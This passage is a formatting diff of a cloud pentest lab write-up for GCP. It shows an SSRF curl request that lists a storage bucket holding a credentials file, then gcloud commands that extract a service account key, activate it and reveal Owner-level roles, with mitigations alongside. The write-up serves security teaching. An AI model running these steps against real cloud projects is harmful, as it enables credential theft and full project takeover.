 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="mitigation-2">Mitigation<a href="#mitigation-2" class="hash-link" aria-label="Direct link to Mitigation" title="Direct link to Mitigation" translate="no">​</a></h3>
 <ul>
 <li class="">
-<p>**Never Expose Secrets:**Remove any endpoints that return secret keys</p>
+<p><strong>Never Expose Secrets:</strong> Remove any endpoints that return secret keys</p>
 </li>
 <li class="">
-<p>**Key Rotation:**Regularly rotate secret keys</p>
+<p><strong>Key Rotation:</strong> Regularly rotate secret keys</p>
 </li>
 <li class="">
-<p>**Secret Management:**Use dedicated secret management services</p>
+<p><strong>Secret Management:</strong> Use dedicated secret management services</p>
 </li>
 <li class="">
-<p>**Access Logging:**Monitor and alert on secret access attempts</p>
+<p><strong>Access Logging:</strong> Monitor and alert on secret access attempts</p>
 </li>
 </ul>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="5-ssrf-to-storage-bucket">5. SSRF to Storage Bucket<a href="#5-ssrf-to-storage-bucket" class="hash-link" aria-label="Direct link to 5. SSRF to Storage Bucket" title="Direct link to 5. SSRF to Storage Bucket" translate="no">​</a></h2>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="objective-4">Objective<a href="#objective-4" class="hash-link" aria-label="Direct link to Objective" title="Direct link to Objective" translate="no">​</a></h3>
 <p>Server-Side Request Forgery (SSRF) allows attackers to make the server send requests to internal resources. In cloud environments, this can be used to access metadata services, internal APIs, and storage buckets.</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="discovery-1">Discovery<a href="#discovery-1" class="hash-link" aria-label="Direct link to Discovery" title="Direct link to Discovery" translate="no">​</a></h3>
-<p>The Cloud Function had a<code>url</code>parameter that appeared to make HTTP requests:</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">curl </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;https://us-central1-cloud-pentest-lab-1769707855.cloudfunctions.net/vulnerable-function-97d005e2/?url=http://storage.googleapis.com/vulnerable-bucket-97d005e2/&quot;</span><br></div></code></pre></div></div>
+<p>The Cloud Function had a <code>url</code> parameter that appeared to make HTTP requests:</p>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">curl &quot;https://us-central1-cloud-pentest-lab-1769707855.cloudfunctions.net/vulnerable-function-97d005e2/?url=http://storage.googleapis.com/vulnerable-bucket-97d005e2/&quot;</span><br></div></code></pre></div></div>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="results-1">Results<a href="#results-1" class="hash-link" aria-label="Direct link to Results" title="Direct link to Results" translate="no">​</a></h3>
 <p>The function successfully accessed the storage bucket and returned an XML listing:</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;UTF-8&#x27;?&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&lt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">ListBucketResult</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&lt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Name</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">vulnerable-bucket-97d005e2</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&lt;/</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Name</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&lt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Contents</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&lt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Key</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">function-code.zip</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&lt;/</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Key</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ...</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&lt;/</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Contents</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&lt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Contents</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&lt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Key</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">secrets/database-credentials.json</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&lt;/</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Key</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ...</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&lt;/</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Contents</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&lt;/</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">ListBucketResult</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&gt;</span><br></div></code></pre></div></div>
-<p>**Critical Discovery:**The bucket contains a file at<code>secrets/database-credentials.json</code>, which likely contains sensitive database credentials.</p>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;UTF-8&#x27;?&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&lt;ListBucketResult&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  &lt;Name&gt;vulnerable-bucket-97d005e2&lt;/Name&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  &lt;Contents&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    &lt;Key&gt;function-code.zip&lt;/Key&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ...</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  &lt;/Contents&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  &lt;Contents&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    &lt;Key&gt;secrets/database-credentials.json&lt;/Key&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ...</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  &lt;/Contents&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&lt;/ListBucketResult&gt;</span><br></div></code></pre></div></div>
+<p><strong>Critical Discovery:</strong> The bucket contains a file at <code>secrets/database-credentials.json</code>, which likely contains sensitive database credentials.</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="how-ssrf-works">How SSRF Works<a href="#how-ssrf-works" class="hash-link" aria-label="Direct link to How SSRF Works" title="Direct link to How SSRF Works" translate="no">​</a></h3>
 <p>The vulnerable code probably looks like:</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">import</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> urllib.request</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">def</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">vulnerable_handler</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">(</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">request</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">):</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    url = request.args.get(</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&#x27;url&#x27;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">if</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> url:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">        response = urllib.request.urlopen(url)  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># VULNERABLE: No URL validation</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">        </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">return</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> response.read()</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">import urllib.request</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">def vulnerable_handler(request):</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    url = request.args.get(&#x27;url&#x27;)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    if url:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">        response = urllib.request.urlopen(url)  # VULNERABLE: No URL validation</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">        return response.read()</span><br></div></code></pre></div></div>
 <p>The function makes HTTP requests to any URL without validation, allowing access to:</p>
 <ul>
 <li class="">
@@ -326,31 +326,31 @@
 <p>SSRF vulnerabilities enable:</p>
 <ul>
 <li class="">
-<p>**Internal Network Access:**Bypass firewall restrictions to access internal services</p>
+<p><strong>Internal Network Access:</strong> Bypass firewall restrictions to access internal services</p>
 </li>
 <li class="">
-<p>**Metadata Service Access:**Access GCP metadata service to obtain service account tokens</p>
+<p><strong>Metadata Service Access:</strong> Access GCP metadata service to obtain service account tokens</p>
 </li>
 <li class="">
-<p>**Storage Enumeration:**List and access files in cloud storage buckets</p>
+<p><strong>Storage Enumeration:</strong> List and access files in cloud storage buckets</p>
 </li>
 <li class="">
-<p>**Credential Extraction:**Access configuration files and credentials stored in buckets</p>
+<p><strong>Credential Extraction:</strong> Access configuration files and credentials stored in buckets</p>
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="mitigation-3">Mitigation<a href="#mitigation-3" class="hash-link" aria-label="Direct link to Mitigation" title="Direct link to Mitigation" translate="no">​</a></h3>
 <ul>
 <li class="">
-<p>**URL Validation:**Whitelist allowed domains and protocols</p>
+<p><strong>URL Validation:</strong> Whitelist allowed domains and protocols</p>
 </li>
 <li class="">
-<p>**Network Segmentation:**Restrict serverless functions from accessing internal resources</p>
+<p><strong>Network Segmentation:</strong> Restrict serverless functions from accessing internal resources</p>
 </li>
 <li class="">
-<p>**Metadata Service Protection:**Use VPC Service Controls to protect metadata service</p>
+<p><strong>Metadata Service Protection:</strong> Use VPC Service Controls to protect metadata service</p>
 </li>
 <li class="">
-<p>**Input Sanitization:**Validate and sanitize all URL inputs</p>
+<p><strong>Input Sanitization:</strong> Validate and sanitize all URL inputs</p>
 </li>
 </ul>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="6-service-account-key-extraction">6. Service Account Key Extraction<a href="#6-service-account-key-extraction" class="hash-link" aria-label="Direct link to 6. Service Account Key Extraction" title="Direct link to 6. Service Account Key Extraction" translate="no">​</a></h2>
@@ -360,12 +360,12 @@
 <p>We discovered that the project uses Secret Manager to store service account keys. With appropriate permissions (or through other vulnerabilities), we could extract these keys.</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="exploitation-2">Exploitation<a href="#exploitation-2" class="hash-link" aria-label="Direct link to Exploitation" title="Direct link to Exploitation" translate="no">​</a></h3>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-1-list-secrets">Step 1: List Secrets<a href="#step-1-list-secrets" class="hash-link" aria-label="Direct link to Step 1: List Secrets" title="Direct link to Step 1: List Secrets" translate="no">​</a></h3>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">gcloud secrets list </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">--format=json</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">gcloud secrets list --format=json</span><br></div></code></pre></div></div>
 <p><strong>Results:</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">[</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">{</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;name&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;projects/265209566722/secrets/exposed-sa-key-97d005e2&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">}</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">]</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">[</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  {</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    &quot;name&quot;: &quot;projects/265209566722/secrets/exposed-sa-key-97d005e2&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">]</span><br></div></code></pre></div></div>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-2-extract-service-account-key">Step 2: Extract Service Account Key<a href="#step-2-extract-service-account-key" class="hash-link" aria-label="Direct link to Step 2: Extract Service Account Key" title="Direct link to Step 2: Extract Service Account Key" translate="no">​</a></h3>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">gcloud secrets versions access latest --secret=</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;exposed-sa-key-97d005e2&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> &gt; sa-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">key</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.json</span><br></div></code></pre></div></div>
-<p>**Result:**Successfully extracted a complete service account key file containing:</p>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">gcloud secrets versions access latest --secret=&quot;exposed-sa-key-97d005e2&quot; &gt; sa-key.json</span><br></div></code></pre></div></div>
+<p><strong>Result:</strong> Successfully extracted a complete service account key file containing:</p>
 <ul>
 <li class="">
 <p>Private key</p>
@@ -384,134 +384,134 @@
 <p>Service account keys provide:</p>
 <ul>
 <li class="">
-<p>**Persistent Access:**Unlike temporary tokens, keys don’t expire</p>
+<p><strong>Persistent Access:</strong> Unlike temporary tokens, keys don’t expire</p>
 </li>
 <li class="">
-<p>**Full Permissions:**Keys grant all permissions assigned to the service account</p>
+<p><strong>Full Permissions:</strong> Keys grant all permissions assigned to the service account</p>
 </li>
 <li class="">
-<p>**No MFA:**Keys bypass multi-factor authentication</p>
+<p><strong>No MFA:</strong> Keys bypass multi-factor authentication</p>
 </li>
 <li class="">
-<p>**Difficult Detection:**Key usage may not be immediately obvious in logs</p>
+<p><strong>Difficult Detection:</strong> Key usage may not be immediately obvious in logs</p>
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="impact-3">Impact<a href="#impact-3" class="hash-link" aria-label="Direct link to Impact" title="Direct link to Impact" translate="no">​</a></h3>
 <p>A compromised service account key can lead to:</p>
 <ul>
 <li class="">
-<p>**Privilege Escalation:**If the service account has high privileges</p>
+<p><strong>Privilege Escalation:</strong> If the service account has high privileges</p>
 </li>
 <li class="">
-<p>**Lateral Movement:**Access other resources the service account can reach</p>
+<p><strong>Lateral Movement:</strong> Access other resources the service account can reach</p>
 </li>
 <li class="">
-<p>**Data Exfiltration:**Read data from services the account can access</p>
+<p><strong>Data Exfiltration:</strong> Read data from services the account can access</p>
 </li>
 <li class="">
-<p>**Resource Manipulation:**Create, modify, or delete cloud resources</p>
+<p><strong>Resource Manipulation:</strong> Create, modify, or delete cloud resources</p>
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="mitigation-4">Mitigation<a href="#mitigation-4" class="hash-link" aria-label="Direct link to Mitigation" title="Direct link to Mitigation" translate="no">​</a></h3>
 <ul>
 <li class="">
-<p>**Avoid Service Account Keys:**Use Workload Identity or Application Default Credentials instead</p>
+<p><strong>Avoid Service Account Keys:</strong> Use Workload Identity or Application Default Credentials instead</p>
 </li>
 <li class="">
-<p>**Key Rotation:**Regularly rotate keys if they must be used</p>
+<p><strong>Key Rotation:</strong> Regularly rotate keys if they must be used</p>
 </li>
 <li class="">
-<p>**Least Privilege:**Grant service accounts only the minimum required permissions</p>
+<p><strong>Least Privilege:</strong> Grant service accounts only the minimum required permissions</p>
 </li>
 <li class="">
-<p>**Key Monitoring:**Monitor and alert on service account key usage</p>
+<p><strong>Key Monitoring:</strong> Monitor and alert on service account key usage</p>
 </li>
 <li class="">
-<p>**Secret Management:**Store keys in Secret Manager with proper access controls</p>
+<p><strong>Secret Management:</strong> Store keys in Secret Manager with proper access controls</p>
 </li>
 </ul>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="7-privilege-escalation">7. Privilege Escalation<a href="#7-privilege-escalation" class="hash-link" aria-label="Direct link to 7. Privilege Escalation" title="Direct link to 7. Privilege Escalation" translate="no">​</a></h2>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="objective-6">Objective<a href="#objective-6" class="hash-link" aria-label="Direct link to Objective" title="Direct link to Objective" translate="no">​</a></h3>
 <p>After extracting the service account key, we needed to authenticate with it and verify what permissions it had. This step determines whether we can escalate our privileges to gain full project control.</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="authentication">Authentication<a href="#authentication" class="hash-link" aria-label="Direct link to Authentication" title="Direct link to Authentication" translate="no">​</a></h3>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">gcloud auth activate-service-account --</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">key</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-file=sa-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">key</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.json</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">gcloud auth activate-service-account --key-file=sa-key.json</span><br></div></code></pre></div></div>
 <p><strong>Result:</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">Activated service account credentials </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">for</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">: [overprivileged-sa</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-97</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">d005e2@cloud-pentest-lab</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-1769707855.i</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">am.gserviceaccount.com]</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">Activated service account credentials for: [overprivileged-sa-97d005e2@cloud-pentest-lab-1769707855.iam.gserviceaccount.com]</span><br></div></code></pre></div></div>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="permission-verification">Permission Verification<a href="#permission-verification" class="hash-link" aria-label="Direct link to Permission Verification" title="Direct link to Permission Verification" translate="no">​</a></h3>
 <p>We checked what IAM roles were assigned to this service account:</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">gcloud projects get-iam-policy cloud-pentest-lab-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">1769707855</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  --flatten=</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;bindings[].members&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  --filter=</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;bindings.members:serviceAccount:overprivileged-sa-97d005e2@cloud-pentest-lab-1769707855.iam.gserviceaccount.com&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  --</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">format</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">=</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;table(bindings.role)&quot;</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">gcloud projects get-iam-policy cloud-pentest-lab-1769707855 \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  --flatten=&quot;bindings[].members&quot; \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  --filter=&quot;bindings.members:serviceAccount:overprivileged-sa-97d005e2@cloud-pentest-lab-1769707855.iam.gserviceaccount.com&quot; \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  --format=&quot;table(bindings.role)&quot;</span><br></div></code></pre></div></div>
 <p><strong>Critical Results:</strong></p>
 <div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">ROLE</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">roles/compute.admin</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">roles/iam.securityAdmin</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">roles/owner</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">roles/secretmanager.admin</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">roles/storage.admin</span><br></div></code></pre></div></div>
-<p><strong>Analysis:<strong>The service account has the</strong>Owner</strong>role, which provides complete control over the entire GCP project. This is a critical misconfiguration.</p>
+<p><strong>Analysis:</strong> The service account has the <strong>Owner</strong> role, which provides complete control over the entire GCP project. This is a critical misconfiguration.</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="understanding-iam-roles">Understanding IAM Roles<a href="#understanding-iam-roles" class="hash-link" aria-label="Direct link to Understanding IAM Roles" title="Direct link to Understanding IAM Roles" translate="no">​</a></h3>
 <ul>
 <li class="">
-<p>**roles/owner:**Full control, including billing and project deletion</p>
+<p><strong>roles/owner:</strong> Full control, including billing and project deletion</p>
 </li>
 <li class="">
-<p>**roles/iam.securityAdmin:**Can modify IAM policies</p>
+<p><strong>roles/iam.securityAdmin:</strong> Can modify IAM policies</p>
 </li>
 <li class="">
-<p>**roles/compute.admin:**Full control over Compute Engine resources</p>
+<p><strong>roles/compute.admin:</strong> Full control over Compute Engine resources</p>
 </li>
 <li class="">
-<p>**roles/secretmanager.admin:**Full control over Secret Manager</p>
+<p><strong>roles/secretmanager.admin:</strong> Full control over Secret Manager</p>
 </li>
 <li class="">
-<p>**roles/storage.admin:**Full control over Cloud Storage</p>
+<p><strong>roles/storage.admin:</strong> Full control over Cloud Storage</p>
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="impact-of-owner-access">Impact of Owner Access<a href="#impact-of-owner-access" class="hash-link" aria-label="Direct link to Impact of Owner Access" title="Direct link to Impact of Owner Access" translate="no">​</a></h3>
 <p>With Owner role, we can:</p>
 <ul>
 <li class="">
-<p>**Create/Delete Resources:**Any resource in the project</p>
+<p><strong>Create/Delete Resources:</strong> Any resource in the project</p>
 </li>
 <li class="">
